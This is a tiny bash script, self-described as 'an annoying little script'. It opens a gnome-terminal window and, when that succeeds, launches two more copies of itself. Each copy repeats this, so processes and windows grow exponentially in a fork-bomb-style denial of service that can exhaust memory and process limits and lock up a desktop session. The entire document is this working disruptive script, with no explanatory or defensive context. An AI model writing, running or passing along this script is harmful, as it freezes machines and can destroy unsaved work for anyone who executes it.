#!/bin/bash

# This is an annoying little script

gnome-terminal

if [ $? -eq 0 ]; then
 $0 & $0;
fi

